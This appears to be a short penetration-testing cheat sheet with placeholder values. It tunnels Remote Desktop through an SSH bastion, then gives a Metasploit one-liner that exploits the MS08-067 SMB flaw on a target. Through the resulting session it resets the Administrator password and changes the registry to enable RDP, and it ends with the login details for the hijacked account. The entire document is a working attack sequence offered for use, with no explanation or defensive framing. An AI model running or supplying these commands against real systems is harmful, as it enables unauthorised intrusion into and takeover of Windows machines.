ssh {BASTION} -l {USER} -L 3389:{VICTIM}:3389

msfconsole -x "use exploit/windows/smb/ms08_067_netapi;set LHOST eth0;set RHOST {VICTIM};set LPORT 4443;exploit;sessions -c 'net user Administrator {PASSWORD}';sessions -c 'reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'"

Microsoft Remote Desktop
localhost, Administrator,{PASSWORD}